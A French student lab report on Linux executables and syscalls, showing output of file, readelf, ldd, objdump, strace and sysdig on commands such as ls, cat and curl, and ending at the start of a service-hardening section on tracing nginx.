# Part I : Learn

Dans cette partie, je vous fais (re)découvrir quelques commandes usuelles quand on travaille autour des programmes et des processus.

**Au menu : on dissèque des programmes, et on repère les syscalls qu'ils utilisent.**

## Sommaire

- [Part I : Learn](#part-i--learn)
  - [Sommaire](#sommaire)
  - [1. Anatomy of a program](#1-anatomy-of-a-program)
    - [A. `file`](#a-file)
    - [B. `readelf`](#b-readelf)
    - [C. `ldd`](#c-ldd)
  - [2. Syscalls basics](#2-syscalls-basics)
    - [A. Syscall list](#a-syscall-list)
    - [B. `objdump`](#b-objdump)

## 1. Anatomy of a program

**Un programme est un fichier *exécutable*. C'est à dire que :** 

- c'est un simple fichier
- il est composé de plusieurs sections
  - la section `.text` contient les instructions du programme pour le CPU
  - les autres sections contiennent essentiellement des metadonnées
- il peut être compilé...
  - statiquement : tout est dans le programme
  - dynamiquement : 
    - le programme pourra faire appel à des librairies du système au moment où il sera lancé
    - elles seront chargées en RAM à ce moment-là
- il est marqué comme étant "exécutable"
  - sur Linux, on donne la permission d'exécution avec `chmod`

Dans cette partie, on va voir quelques outils très usuels pour obtenir des infos sur un programme.

### A. `file`

`file` est une commande qui permet de déterminer le type d'un fichier.

Ceci ne repose pas du tout sur l'extension du fichier. `file` regarde directement les bits qui composent le fichier pour en déterminer le type. Il se concentre essentiellement sur les premiers octets du fichiers qui contient généralement des métadonnées suffisantes pour déterminer le type.

🌞 **Utiliser `file` pour déterminer le type de :**
```bash
[telos@vbox ~]$ file /usr/bin/ls
/usr/bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1afdd52081d4b8b631f2986e26e69e0b275e159c, for GNU/Linux 3.2.0, stripped
```
```sh
[telos@vbox ~]$ file /sbin/ip
/sbin/ip: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=77a2f5899f0529f27d87bb29c6b84c535739e1c7, for GNU/Linux 3.2.0, stripped
```
```
[telos@vbox ~]$ file test.mp3
test.mp3: Audio file with ID3 version 2.4.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
```

> Le format des exécutables sous les OS Linux est appelé ELF : *Executable and Linkable Format*. ELF est le format qui définit l'ordre des octets dans un programme, le fait qu'il doit être composé de plusieurs sections, comment il doit indiquer les librairies externes dont il a besoin, etc. L'équivalent du format `.exe` sous Windows.

### B. `readelf`

`readelf` permet d'obtenir des informations sur un fichier ELF : un exécutable Linux.

De la même façon qu'un fichier texte possède des numéros de ligne quand on l'affiche, si on affiche le contenu d'un programme, chaque ligne est numérotée.

Chaque ligne du programme a donc une adresse, qui est généralement représentée en hexadécimal.

`readelf` permet notamment de voir de quelle adresse à quelle adresse se trouve  telle ou telle section.

🌞 **Utiliser `readelf` sur le programme `ls`**

```bash
[telos@vbox ~]$ readelf /usr/bin/ls -h -S
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Shared object file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x6b10
  Start of program headers:          64 (bytes into file)
  Start of section headers:          139032 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         13
  Size of section headers:           64 (bytes)
  Number of section headers:         30
  Section header string table index: 29

Section Headers:
[...]
  [15] .text             PROGBITS         0000000000004d50  00004d50      
       0000000000012532  0000000000000000  AX       0     0     16
[...]
```

### C. `ldd`

`ldd` est un outil qui permet de manipuler le *dynamic linker* de Linux. Le *dynamic linker* c'est un programme qui s'occupe de trouver les librairies nécessaires quand un autre programme se lance.

**On peut utiliser `ldd` notamment pour visualiser de quelle librairie a besoin un programme donné.**

🌞 **Utiliser `ldd` sur le programme `ls`**

```sh
[telos@vbox ~]$ ldd /usr/bin/ls
        linux-vdso.so.1 (0x00007ffeba9e2000)
        libselinux.so.1 => /lib64/libselinux.so.1 (0x00007f1aaaad4000)
        libcap.so.2 => /lib64/libcap.so.2 (0x00007f1aaaaca000)
        libc.so.6 => /lib64/libc.so.6 (0x00007f1aaa800000)  <----
        libpcre2-8.so.0 => /lib64/libpcre2-8.so.0 (0x00007f1aaaa2e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f1aaab2b000)
```

> La Glibc est une des librairies les plus importantes au sein d'un système Linux, car elle contient notamment tout le nécessaire pour passer des *syscalls* élémentaires. Si un programme souhaite lire ou écrire dans un fichier par exemple, il aura besoin d'inclure la Glibc.

## 2. Syscalls basics

### A. Syscall list

> Vous pourrez trouver une [liste des syscalls Linux sur un système x86_64 iciiii](https://filippo.io/linux-syscall-table/).

🌞 **Donner le nom ET l'identifiant unique d'un syscall qui permet à un processus de...**

🌞 Donner le nom ET l'identifiant unique d'un syscall qui permet à un processus de...

``lire un fichier stocké sur disque`` :

```
Nom du syscall : read
Identifiant unique : 0
```

``écrire dans un fichier stocké sur disque`` :

```
Nom du syscall : write
Identifiant unique : 1
```

``lancer un nouveau processus`` :

```
Nom du syscall : execve
Identifiant unique : 59
```
![Fork exec](./img/forkexec.png)

### B. `objdump`

`objdump` permet de désassembler un programme, c'est à dire d'afficher le code contenu par un exécutable, sous forme de langage assembleur compréhensible par les humains (un peu, beaucoup plus qu'une purée d'octets en tout cas !)

🌞 **Utiliser `objdump`** sur la commande `ls`

```sh
    4d51:       e8 da f9 ff ff          callq  4730 <abort@plt>
    4d56:       e8 d5 f9 ff ff          callq  4730 <abort@plt>
    4d5b:       e8 d0 f9 ff ff          callq  4730 <abort@plt>
    4d60:       e8 cb f9 ff ff          callq  4730 <abort@plt>
    4d65:       e8 c6 f9 ff ff          callq  4730 <abort@plt>
    [...]
[telos@vbox ~]$ objdump -d -j .text /bin/ls | grep 'syscall'
[telos@vbox ~]$
```

🌞 **Utiliser `objdump`** sur la librairie Glibc

🌞 Utiliser objdump sur la librairie Glibc

``mettez en évidence quelques lignes qui contiennent l'instruction syscall`` :

```
[telos@vbox ~]$ objdump -d /lib64/libc.so.6 | grep -A 2 -B 2 "syscall" | head -n 25
   295f0:       31 ff                   xor    %edi,%edi
   295f2:       89 d0                   mov    %edx,%eax
   295f4:       0f 05                   syscall
   295f6:       eb f8                   jmp    295f0 <__libc_start_call_main+0xa0>
   295f8:       31 ff                   xor    %edi,%edi
--
000000000003e730 <__restore_rt>:
   3e730:       48 c7 c0 0f 00 00 00    mov    $0xf,%rax
   3e737:       0f 05                   syscall
   3e739:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

--
   3e7f6:       41 ba 08 00 00 00       mov    $0x8,%r10d
   3e7fc:       b8 0d 00 00 00          mov    $0xd,%eax
   3e801:       0f 05                   syscall
   3e803:       48 3d 00 f0 ff ff       cmp    $0xfffffffffffff000,%rax
   3e809:       0f 87 f1 00 00 00       ja     3e900 <__libc_sigaction+0x1c0>
--
   3e960:       f3 0f 1e fa             endbr64
   3e964:       b8 3e 00 00 00          mov    $0x3e,%eax
   3e969:       0f 05                   syscall
   3e96b:       48 3d 01 f0 ff ff       cmp    $0xfffffffffffff001,%rax
   3e971:       73 01                   jae    3e974 <kill+0x14>
--
   3e994:       be 08 00 00 00          mov    $0x8,%esi
```

``trouvez l'instrution syscall qui exécute le syscall close()`` :

```
[telos@vbox ~]$ objdump -d /lib64/libc.so.6 | grep -A 2 -B 2 "syscall" | grep "0x3,%eax" -A 3
   94b64:       b8 03 00 00 00          mov    $0x3,%eax
   94b69:       0f 05                   syscall
   94b6b:       48 3d 00 f0 ff ff       cmp    $0xfffffffffffff000,%rax
   94b71:       77 05                   ja     94b78 <mq_close@@GLIBC_2.34+0x18>
--
   fe230:       b8 03 00 00 00          mov    $0x3,%eax
   fe235:       0f 05                   syscall
   fe237:       48 3d 00 f0 ff ff       cmp    $0xfffffffffffff000,%rax
   fe23d:       77 41                   ja     fe280 <__close+0x60>
--
   fe254:       b8 03 00 00 00          mov    $0x3,%eax
   fe259:       0f 05                   syscall
   fe25b:       48 3d 00 f0 ff ff       cmp    $0xfffffffffffff000,%rax
   fe261:       77 35                   ja     fe298 <__close+0x78>
--
  102774:       b8 03 00 00 00          mov    $0x3,%eax
  102779:       0f 05                   syscall
  10277b:       48 3d 00 f0 ff ff       cmp    $0xfffffffffffff000,%rax
  102781:       77 05                   ja     102788 <__close_nocancel+0x18>
--
  127c06:       b8 03 00 00 00          mov    $0x3,%eax
  127c0b:       0f 05                   syscall
  127c0d:       c3                      retq
  127c0e:       66 90                   xchg   %ax,%ax
--
  127cc2:       b8 03 00 00 00          mov    $0x3,%eax
  127cc7:       0f 05                   syscall
  127cc9:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  127cce:       eb cf                   jmp    127c9f <__netlink_open+0x8f>
--
  127e95:       b8 03 00 00 00          mov    $0x3,%eax
  127e9a:       8b 7d a0                mov    -0x60(%rbp),%edi
  127e9d:       0f 05                   syscall
  127e9f:       48 8b 45 c8             mov    -0x38(%rbp),%rax
```

![How it works](./img/syscall_work.jpg)


# Part II : Observe

**Il est possible d'observer en temps réel ce que fait un programme. On dit qu'on peut *tracer* un programme.**

Plusieurs techniques pour faire ça, suivant ce qu'on veut voir ; dans ce TP on va se concentrer sur les *syscalls*.

L'outil le plus élémentaire à connaître est `strace`. Il s'utilise en terminal et affiche tous les *syscalls*  que réalisent un processus.

On va aussi utiliser `sysdig` plus moderne et plus puissant.

## Sommaire

- [Part II : Observe](#part-ii--observe)
  - [Sommaire](#sommaire)
  - [1. strace](#1-strace)
  - [2. sysdig](#2-sysdig)
    - [A. Intro](#a-intro)
    - [B. Use it](#b-use-it)
  - [3. Bonus : Stratoshark](#3-bonus--stratoshark)

## 1. strace

Si on veut tracer un processus avec `strace`, c'est comme ça :

```bash
# pour tracer l'exécution d'un echo par exemple
$ strace echo yo
```

🌞 **Utiliser `strace` pour tracer l'exécution de la commande `ls`**

```sh 
[telos@vbox ~]$ strace ls Oui/ 2>&1 | grep "write"
write(1, "er\noui\n", 7er
[telos@vbox ~]$
```

🌞 **Utiliser `strace` pour tracer l'exécution de la commande `cat`**
```
[telos@vbox ~]$ strace cat tki 2>&1 | grep "write"
write(1, "Salut je m'appelle Alberto Delam"..., 36Salut je m'appelle Alberto Delamama
[telos@vbox ~]$
```
```sh
[telos@vbox ~]$ strace cat tki 2>&1 | grep "tki"
execve("/usr/bin/cat", ["cat", "tki"], 0x7ffca07bdd38 /* 31 vars */) = 0
openat(AT_FDCWD, "tki", O_RDONLY)       = 3  <----
```

🌞 **Utiliser `strace` pour tracer l'exécution de `curl example.org`**

```
[telos@vbox CYBER]$ strace -c curl example.org
<!doctype html>
<html>
<head>
    <title>Example Domain</title>

    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style type="text/css">
    body {
        background-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;

    }
    div {
        width: 600px;
        margin: 5em auto;
        padding: 2em;
        background-color: #fdfdff;
        border-radius: 0.5em;
        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
    }
    a:link, a:visited {
        color: #38488f;
        text-decoration: none;
    }
    @media (max-width: 700px) {
        div {
            margin: 0 auto;
            width: auto;
        }
    }
    </style>
</head>

<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is for use in illustrative examples in documents. You may use this
    domain in literature without prior coordination or asking for permission.</p>
    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
</div>
</body>
</html>
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 23.58    0.005167          36       141           mmap
 10.55    0.002312          38        60        14 openat
 10.36    0.002271          42        54           close
  8.60    0.001885          35        53           rt_sigaction
  8.34    0.001828         114        16           poll
  7.59    0.001663          47        35           mprotect
  7.42    0.001626          35        46           fstat
  5.23    0.001146          31        36           read
  3.41    0.000748          35        21           futex
  1.89    0.000415         415         1         1 connect
  1.73    0.000380         190         2           newfstatat
  1.41    0.000310         310         1           clone3
  0.98    0.000215          30         7           write
  0.89    0.000196          98         2           socket
  0.88    0.000193          64         3           rt_sigprocmask
  0.77    0.000168          28         6           fcntl
  0.68    0.000148          37         4           setsockopt
  0.60    0.000132          33         4           brk
  0.58    0.000127          31         4           pread64
  0.51    0.000111          55         2           socketpair
  0.46    0.000101          50         2           statfs
  0.42    0.000093          93         1           getsockopt
  0.42    0.000091          45         2           getdents64
  0.38    0.000083          83         1           getpeername
  0.31    0.000069          34         2           ioctl
  0.22    0.000049          49         1           sysinfo
  0.22    0.000048          48         1           getsockname
  0.21    0.000045          45         1           recvfrom
  0.20    0.000043          43         1           munmap
  0.19    0.000042          21         2         1 arch_prctl
  0.19    0.000041          41         1           pipe
  0.18    0.000039          19         2         1 access
  0.15    0.000033          33         1           rseq
  0.15    0.000032          32         1           prlimit64
  0.15    0.000032          32         1           getrandom
  0.14    0.000031          31         1           set_robust_list
  0.02    0.000004           4         1           set_tid_address
  0.00    0.000000           0         1           sendto
  0.00    0.000000           0         1           execve
------ ----------- ----------- --------- --------- ----------------
100.00    0.021917          41       522        17 total
```

## 2. sysdig

### A. Intro

`sysdig` est un outil qui permet de faire pleiiin de trucs, et notamment tracer les *syscalls*  que le kernel reçoit.

Si on le lance sans préciser, il affichera TOUS les *syscalls*  que reçoit votre kernel.

On peut ajouter des filtres, pour ne voir que les *syscalls*  qui nous intéressent.

Par exemple :

```bash
# si on veut tracer les *syscalls*  effectués par le programme echo
sysdig proc.name=echo
```

> Il existe des tonnes et des tonnes de champs utilisables pour les filtres, on peut consulter la liste avec `sysdig -l`.

Ensuite on le laisse tourner, et si un *syscall* est appelé et que ça matche notre filtre, il s'affichera !

Pour installer sysdig, utilisez les commandes suivantes (instructions pour Rocky Linux 9) :

```bash
# mettons complètement à jour l'OS d'abord si nécessaire
sudo dnf update -y 

# installer sysdig et ses dépendances
sudo dnf install -y epel-release
sudo dnf install -y dkms gcc kernel-devel make perl kernel-headers

# redémarrer pour charger la nouvelle version du kernel si besoin (c'est automatique, juste lance un reboot)
sudo reboot

curl -SLO https://github.com/draios/sysdig/releases/download/0.39.0/sysdig-0.39.0-x86_64.rpm
sudo rpm -ivh sysdig-0.39.0-x86_64.rpm
```

### B. Use it

🌞 **Utiliser `sysdig` pour tracer les *syscalls*  effectués par `ls`**

```
[telos@vbox ~]$ sudo sysdig proc.name=ls
1832 14:31:23.530858089 1 ls (1410.1410) < execve res=0 exe=ls args=--color=auto.CYBER/. tid=1410(ls) pid=1410(ls) ptid=1367(bash) cwd=<NA> fdlimit=1024 pgft_maj=0 pgft_min=30 vm_size=524 vm_rss=0 vm_swap=0 comm=ls cgroups=cpuset=/.cpu=/.cpuacct=/.io=/.memory=/user.slice/user-1000.slice/session-3.sc... env=SHELL=/bin/bash.HISTCONTROL=ignoredups.HISTSIZE=1000.HOSTNAME=vbox.PWD=/home/... tty=34817 pgid=1410(ls) loginuid=1000(telos) flags=0 cap_inheritable=0 cap_permitted=0 cap_effective=0 exe_ino=33899672 exe_ino_ctime=2025-02-20 10:06:33.456577163 exe_ino_mtime=2024-11-06 17:29:20.000000000 uid=1000(telos) trusted_exepath=/usr/bin/ls
1833 14:31:23.530876301 1 ls (1410.1410) > brk addr=0
1834 14:31:23.530876795 1 ls (1410.1410) < brk res=564D521B0000 vm_size=524 vm_rss=128 vm_swap=0
1842 14:31:23.531970430 1 ls (1410.1410) > arch_prctl
1843 14:31:23.531971486 1 ls (1410.1410) < arch_prctl
1844 14:31:23.531990664 1 ls (1410.1410) > access mode=4(R_OK)
1845 14:31:23.531996099 1 ls (1410.1410) < access res=-2(ENOENT) name=/etc/ld.so.preload
1846 14:31:23.532001446 1 ls (1410.1410) > openat dirfd=-100(AT_FDCWD) name=/etc/ld.so.cache flags=4097(O_RDONLY|O_CLOEXEC) mode=0
1847 14:31:23.532006428 1 ls (1410.1410) < openat fd=3(<f>/etc/ld.so.cache) dirfd=-100(AT_FDCWD) name=/etc/ld.so.cache flags=4097(O_RDONLY|O_CLOEXEC) mode=0 dev=FD00 ino=33685637
1848 14:31:23.532007198 1 ls (1410.1410) > fstat fd=3(<f>/etc/ld.so.cache)
1849 14:31:23.532008213 1 ls (1410.1410) < fstat res=0
1850 14:31:23.532008645 1 ls (1410.1410) > mmap addr=0 length=14083 prot=1(PROT_READ) flags=2(MAP_PRIVATE) fd=3(<f>/etc/ld.so.cache) offset=0
1851 14:31:23.532014171 1 ls (1410.1410) < mmap res=140714228027392 vm_size=540 vm_rss=128 vm_swap=0
1852 14:31:23.532014599 1 ls (1410.1410) > close fd=3(<f>/etc/ld.so.cache)
1853 14:31:23.532014883 1 ls (1410.1410) < close res=0
1854 14:31:23.532018126 1 ls (1410.1410) > openat dirfd=-100(AT_FDCWD) name=/lib64/libselinux.so.1 flags=4097(O_RDONLY|O_CLOEXEC) mode=0
1855 14:31:23.532022135 1 ls (1410.1410) < openat fd=3(<f>/lib64/libselinux.so.1) dirfd=-100(AT_FDCWD) name=/lib64/libselinux.so.1 flags=4097(O_RDONLY|O_CLOEXEC) mode=0 dev=FD00 ino=50505414
1856 14:31:23.532022519 1 ls (1410.1410) > read fd=3(<f>/lib64/libselinux.so.1) size=832
1857 14:31:23.532024066 1 ls (1410.1410) < read res=832 data=.ELF..............>.....pp......@...................@.8...@.....................
1858 14:31:23.532024819 1 ls (1410.1410) > fstat fd=3(<f>/lib64/libselinux.so.1)
1859 14:31:23.532025124 1 ls (1410.1410) < fstat res=0
1860 14:31:23.532025417 1 ls (1410.1410) > mmap addr=0 length=8192 prot=3(PROT_READ|PROT_WRITE) flags=10(MAP_PRIVATE|MAP_ANONYMOUS) fd=-1(EPERM) offset=0
1861 14:31:23.532027401 1 ls (1410.1410) < mmap res=140714228019200 vm_size=548 vm_rss=128 vm_swap=0
1862 14:31:23.532029333 1 ls (1410.1410) > mmap addr=0 length=181896 prot=1(PROT_READ) flags=1026(MAP_PRIVATE|MAP_DENYWRITE) fd=3(<f>/lib64/libselinux.so.1) offset=0
1863 14:31:23.532032015 1 ls (1410.1410) < mmap res=140714227834880 vm_size=728 vm_rss=128 vm_swap=0
1864 14:31:23.532032243 1 ls (1410.1410) > mmap addr=7FFA95910000 length=110592 prot=5(PROT_READ|PROT_EXEC) flags=1030(MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE) fd=3(<f>/lib64/libselinux.so.1) offset=24576
1865 14:31:23.532038842 1 ls (1410.1410) < mmap res=140714227859456 vm_size=728 vm_rss=128 vm_swap=0
1866 14:31:23.532039055 1 ls (1410.1410) > mmap addr=7FFA9592B000 length=32768 prot=1(PROT_READ) flags=1030(MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE) fd=3(<f>/lib64/libselinux.so.1) offset=135168
1867 14:31:23.532042932 1 ls (1410.1410) < mmap res=140714227970048 vm_size=728 vm_rss=128 vm_swap=0
1868 14:31:23.532043130 1 ls (1410.1410) > mmap addr=7FFA95933000 length=8192 prot=3(PROT_READ|PROT_WRITE) flags=1030(MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE) fd=3(<f>/lib64/libselinux.so.1) offset=163840
1869 14:31:23.532046705 1 ls (1410.1410) < mmap res=140714228002816 vm_size=728 vm_rss=128 vm_swap=0
1870 14:31:23.532048750 1 ls (1410.1410) > mmap addr=7FFA95935000 length=5768 prot=3(PROT_READ|PROT_WRITE) flags=14(MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS) fd=-1(EPERM) offset=0
1871 14:31:23.532050704 1 ls (1410.1410) < mmap res=140714228011008 vm_size=728 vm_rss=128 vm_swap=0
...
2212 14:31:23.532792935 1 ls (1410.1410) > write fd=1(<f>/dev/pts/1) size=39
2213 14:31:23.532797721 1 ls (1410.1410) > switch next=31 pgft_maj=0 pgft_min=135 vm_size=6528 vm_rss=2304 vm_swap=0
2215 14:31:23.532937709 1 ls (1410.1410) < write res=39 data=hello  .[0m.[01;36mmonsupermp3.mp3.[0m.
2216 14:31:23.532938721 1 ls (1410.1410) > switch next=31 pgft_maj=0 pgft_min=135 vm_size=6528 vm_rss=2304 vm_swap=0
2218 14:31:23.532941965 1 ls (1410.1410) > rt_sigaction
2219 14:31:23.532942446 1 ls (1410.1410) < rt_sigaction
2220 14:31:23.532942662 1 ls (1410.1410) > rt_sigaction
2221 14:31:23.532942818 1 ls (1410.1410) < rt_sigaction
2222 14:31:23.532942948 1 ls (1410.1410) > rt_sigaction
2223 14:31:23.532943085 1 ls (1410.1410) < rt_sigaction
2224 14:31:23.532943217 1 ls (1410.1410) > rt_sigaction
2225 14:31:23.532943377 1 ls (1410.1410) < rt_sigaction
2226 14:31:23.532943508 1 ls (1410.1410) > rt_sigaction
2227 14:31:23.532943635 1 ls (1410.1410) < rt_sigaction
2228 14:31:23.532943775 1 ls (1410.1410) > rt_sigaction
2229 14:31:23.532943899 1 ls (1410.1410) < rt_sigaction
2230 14:31:23.532944030 1 ls (1410.1410) > rt_sigaction
2231 14:31:23.532944155 1 ls (1410.1410) < rt_sigaction
2232 14:31:23.532944455 1 ls (1410.1410) > rt_sigaction
2233 14:31:23.532944657 1 ls (1410.1410) < rt_sigaction
2234 14:31:23.532944796 1 ls (1410.1410) > rt_sigaction
2235 14:31:23.532944922 1 ls (1410.1410) < rt_sigaction
2236 14:31:23.532945054 1 ls (1410.1410) > rt_sigaction
2237 14:31:23.532945176 1 ls (1410.1410) < rt_sigaction
2238 14:31:23.532945308 1 ls (1410.1410) > rt_sigaction
2239 14:31:23.532945431 1 ls (1410.1410) < rt_sigaction
2240 14:31:23.532945584 1 ls (1410.1410) > rt_sigaction
2241 14:31:23.532945712 1 ls (1410.1410) < rt_sigaction
2242 14:31:23.532947217 1 ls (1410.1410) > close fd=1(<f>/dev/pts/1)
2243 14:31:23.532947644 1 ls (1410.1410) < close res=0
2244 14:31:23.532948204 1 ls (1410.1410) > close fd=2(<f>/dev/pts/1)
2245 14:31:23.532948323 1 ls (1410.1410) < close res=0
2252 14:31:23.532961968 1 ls (1410.1410) > exit_group
2262 14:31:23.533029559 1 ls (1410.1410) > procexit status=0 ret=0 sig=0 core=0 reaper_tid=0
```

``Le syscall pour écrire dans le terminal le résultat du ls`` :

```
2215 14:31:23.532937709 1 ls (1410.1410) < write res=39 data=hello  .[0m.[01;36mmonsupermp3.mp3.[0m.
```

🌞 Utiliser sysdig pour tracer les syscalls effectués par cat

```
[telos@vbox ~]$ sudo sysdig proc.name=cat
1397 14:59:01.555480034 0 cat (1353.1353) < execve res=0 exe=cat args=hello. tid=1353(cat) pid=1353(cat) ptid=1314(bash) cwd=<NA> fdlimit=1024 pgft_maj=0 pgft_min=27 vm_size=420 vm_rss=0 vm_swap=0 comm=cat cgroups=cpuset=/.cpu=/.cpuacct=/.io=/.memory=/user.slice/user-1000.slice/session-3.sc... env=SHELL=/bin/bash.HISTCONTROL=ignoredups.HISTSIZE=1000.HOSTNAME=vbox.PWD=/home/... tty=34817 pgid=1353(cat) loginuid=1000(telos) flags=0 cap_inheritable=0 cap_permitted=0 cap_effective=0 exe_ino=33896374 exe_ino_ctime=2025-02-20 10:06:33.456577163 exe_ino_mtime=2024-11-06 17:29:20.000000000 uid=1000(telos) trusted_exepath=/usr/bin/cat
1398 14:59:01.555496340 0 cat (1353.1353) > brk addr=0
1399 14:59:01.555496885 0 cat (1353.1353) < brk res=55FA38FD7000 vm_size=420 vm_rss=128 vm_swap=0
1400 14:59:01.556488361 0 cat (1353.1353) > arch_prctl
1401 14:59:01.556488993 0 cat (1353.1353) < arch_prctl
1402 14:59:01.556507046 0 cat (1353.1353) > access mode=4(R_OK)
1403 14:59:01.556511340 0 cat (1353.1353) < access res=-2(ENOENT) name=/etc/ld.so.preload
1404 14:59:01.556513907 0 cat (1353.1353) > openat dirfd=-100(AT_FDCWD) name=/etc/ld.so.cache flags=4097(O_RDONLY|O_CLOEXEC) mode=0
1405 14:59:01.556517445 0 cat (1353.1353) < openat fd=3(<f>/etc/ld.so.cache) dirfd=-100(AT_FDCWD) name=/etc/ld.so.cache flags=4097(O_RDONLY|O_CLOEXEC) mode=0 dev=FD00 ino=34185391
1406 14:59:01.556518283 0 cat (1353.1353) > fstat fd=3(<f>/etc/ld.so.cache)
1407 14:59:01.556519748 0 cat (1353.1353) < fstat res=0
1408 14:59:01.556520118 0 cat (1353.1353) > mmap addr=0 length=14083 prot=1(PROT_READ) flags=2(MAP_PRIVATE) fd=3(<f>/etc/ld.so.cache) offset=0
1409 14:59:01.556523669 0 cat (1353.1353) < mmap res=140606503944192 vm_size=436 vm_rss=128 vm_swap=0
1410 14:59:01.556524020 0 cat (1353.1353) > close fd=3(<f>/etc/ld.so.cache)
1411 14:59:01.556524267 0 cat (1353.1353) < close res=0
1412 14:59:01.556527563 0 cat (1353.1353) > openat dirfd=-100(AT_FDCWD) name=/lib64/libc.so.6 flags=4097(O_RDONLY|O_CLOEXEC) mode=0
1413 14:59:01.556530239 0 cat (1353.1353) < openat fd=3(<f>/lib64/libc.so.6) dirfd=-100(AT_FDCWD) name=/lib64/libc.so.6 flags=4097(O_RDONLY|O_CLOEXEC) mode=0 dev=FD00 ino=50331794
1414 14:59:01.556530599 0 cat (1353.1353) > read fd=3(<f>/lib64/libc.so.6) size=832
1415 14:59:01.556532064 0 cat (1353.1353) < read res=832 data=.ELF..............>.............@.........&.........@.8...@.F.E.........@.......
1416 14:59:01.556532497 0 cat (1353.1353) > pread fd=3(<f>/lib64/libc.so.6) size=784 pos=64
1417 14:59:01.556533053 0 cat (1353.1353) < pread res=784 data=........@.......@.......@.......................................`'......`'......
1418 14:59:01.556533479 0 cat (1353.1353) > pread fd=3(<f>/lib64/libc.so.6) size=48 pos=848
...
563 14:41:22.852315071 1 cat (1425.1425) > arch_prctl
564 14:41:22.852315769 1 cat (1425.1425) < arch_prctl
565 14:41:22.852336008 1 cat (1425.1425) > access mode=4(R_OK)
566 14:41:22.852341501 1 cat (1425.1425) < access res=-2(ENOENT) name=/etc/ld.so.preload
567 14:41:22.852345683 1 cat (1425.1425) > openat dirfd=-100(AT_FDCWD) name=/etc/ld.so.cache flags=4097(O_RDONLY|O_CLOEXEC) mode=0
568 14:41:22.852351287 1 cat (1425.1425) < openat fd=3(<f>/etc/ld.so.cache) dirfd=-100(AT_FDCWD) name=/etc/ld.so.cache flags=4097(O_RDONLY|O_CLOEXEC) mode=0 dev=FD00 ino=33685637
569 14:41:22.852351973 1 cat (1425.1425) > fstat fd=3(<f>/etc/ld.so.cache)
570 14:41:22.852353560 1 cat (1425.1425) < fstat res=0
571 14:41:22.852354021 1 cat (1425.1425) > mmap addr=0 length=14083 prot=1(PROT_READ) flags=2(MAP_PRIVATE) fd=3(<f>/etc/ld.so.cache) offset=0
572 14:41:22.852358443 1 cat (1425.1425) < mmap res=139800978092032 vm_size=436 vm_rss=128 vm_swap=0
573 14:41:22.852358873 1 cat (1425.1425) > close fd=3(<f>/etc/ld.so.cache)
574 14:41:22.852359168 1 cat (1425.1425) < close res=0
575 14:41:22.852362741 1 cat (1425.1425) > openat dirfd=-100(AT_FDCWD) name=/lib64/libc.so.6 flags=4097(O_RDONLY|O_CLOEXEC) mode=0
576 14:41:22.852367906 1 cat (1425.1425) < openat fd=3(<f>/lib64/libc.so.6) dirfd=-100(AT_FDCWD) name=/lib64/libc.so.6 flags=4097(O_RDONLY|O_CLOEXEC) mode=0 dev=FD00 ino=50331794
577 14:41:22.852368269 1 cat (1425.1425) > read fd=3(<f>/lib64/libc.so.6) size=832
578 14:41:22.852369860 1 cat (1425.1425) < read res=832 data=.ELF..............>.............@.........&.........@.8...@.F.E.........@.......
579 14:41:22.852370475 1 cat (1425.1425) > pread fd=3(<f>/lib64/libc.so.6) size=784 pos=64
580 14:41:22.852371132 1 cat (1425.1425) < pread res=784 data=........@.......@.......@.......................................`'......`'......
581 14:41:22.852371616 1 cat (1425.1425) > pread fd=3(<f>/lib64/libc.so.6) size=48 pos=848
582 14:41:22.852371869 1 cat (1425.1425) < pread res=48 data=.... .......GNU.................................
583 14:41:22.852372153 1 cat (1425.1425) > pread fd=3(<f>/lib64/libc.so.6) size=68 pos=896
584 14:41:22.852372357 1 cat (1425.1425) < pread res=68 data=............GNU.z@.,...O=fvr2.6J..H`............GNU.................
585 14:41:22.852372818 1 cat (1425.1425) > fstat fd=3(<f>/lib64/libc.so.6)
586 14:41:22.852373479 1 cat (1425.1425) < fstat res=0
587 14:41:22.852373742 1 cat (1425.1425) > mmap addr=0 length=8192 prot=3(PROT_READ|PROT_WRITE) flags=10(MAP_PRIVATE|MAP_ANONYMOUS) fd=-1(EPERM) offset=0
588 14:41:22.852376456 1 cat (1425.1425) < mmap res=139800978083840 vm_size=444 vm_rss=128 vm_swap=0
```

``Le syscall qui écrit le contenu du fichier dans le terminal`` :

```
[telos@vbox ~]$ sysdig -r meo.scap | grep "write"
544 14:41:22.373105166 0 cat (1424) > write fd=1 size=14
546 14:41:22.373114512 0 cat (1424) < write res=14 data=Hello World !.
```

🌞 Utiliser sysdig pour tracer les syscalls  effectués par votre utilisateur

```
[telos@vbox ~]$ sudo sysdig user.name=telos
```


# Part III : Service Hardening

🌞 Tracer l'exécution du programme NGINX

```
[telos@vbox ~]$ sudo sysdig proc.name=nginx
